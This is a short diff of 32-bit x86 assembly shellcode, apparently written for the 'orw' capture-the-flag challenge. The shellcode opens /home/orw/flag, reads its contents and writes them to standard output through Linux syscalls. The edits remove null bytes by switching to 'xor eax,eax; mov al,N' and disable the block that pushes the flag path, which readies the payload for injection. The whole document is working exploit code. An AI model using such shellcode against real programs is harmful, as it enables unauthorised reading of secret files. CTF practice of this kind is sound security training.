@@ -5,9 +5,10 @@ BUFSIZE: equ 0x40
 
 _start:
     sub esp, (BUFSIZE-16)
+    xor eax,eax
 
     ; /home/orw/flag
-    %if 1
+    %if 0
     push 0x6761
     push 0x6c662f77
     push 0x726f2f65
@@ -22,20 +23,21 @@ _start:
     %endif
 
     mov ebx,esp
-    xor edx,edx ; mode
     xor ecx,ecx ; O_RDONLY
-    mov eax,5 ; open
+    mov al,5 ; open
     int 0x80
 
     mov ebx,eax
     mov ecx,esp
     mov edx,BUFSIZE
-    mov eax,3 ; read
+    xor eax,eax
+    mov al,3 ; read
     int 0x80
 
     mov ebx,1
     mov edx,eax
-    mov eax,4 ; write
+    xor eax,eax
+    mov al,4 ; write
     int 0x80
 
     add esp,BUFSIZE
